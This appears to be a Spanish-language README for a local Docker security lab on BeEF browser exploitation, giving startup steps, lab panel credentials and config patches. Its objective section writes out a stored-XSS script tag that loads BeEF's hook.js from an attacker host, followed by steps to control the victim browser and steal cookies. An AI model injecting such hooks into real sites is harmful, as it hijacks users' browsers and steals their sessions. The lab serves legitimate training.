###############################################################################
# Lab 04.4 - Browser Exploitation Framework (BeEF) 🕸️
###############################################################################

Este entorno simula un ataque de inyección XSS persistente para tomar el control de navegadores remotos utilizando BeEF.

## 🚀 Cómo Iniciar
No es necesario instalar nada manualmente, el contenedor se auto-configura al arrancar.

1. Levantar contenedores:
   ```bash
   docker compose up -d
   ```
2. Esperar a que BeEF termine de configurarse (puedes ver el progreso con `docker logs -f lab_beef_atacante`).
3. Acceder al panel de control.

---

## 🔐 Credenciales de Acceso
- **URL Panel:** [http://localhost:3000/ui/panel](http://localhost:3000/ui/panel)
- **Usuario:** `beef`
- **Contraseña:** `Cisco_Lab_2026!`

---

## 🛠️ Notas de Configuración (Automatizadas en setup_beef.sh)
Para asegurar que BeEF funcione correctamente en Docker, se han aplicado los siguientes parches:
- **Proxy Port:** Cambiado de 6789 a **6791** para evitar conflictos.
- **GeoIP:** Desactivado para acelerar el arranque y evitar errores de base de datos faltante.
- **Persistencia:** Se utiliza `bundle install` interno para manejar dependencias de Ruby dinámicamente.

---

## 🎯 Objetivo del Lab
1. Inyectar el hook de BeEF en el sitio vulnerable (`http://localhost:8083`):
   ```html
   <script src="http://172.32.0.10:3000/hook.js"></script>
   ```
2. Simular el acceso de una víctima.
3. Ejecutar comandos de control (p. ej., `Alert`, `Steal Cookies`) desde el panel de BeEF.
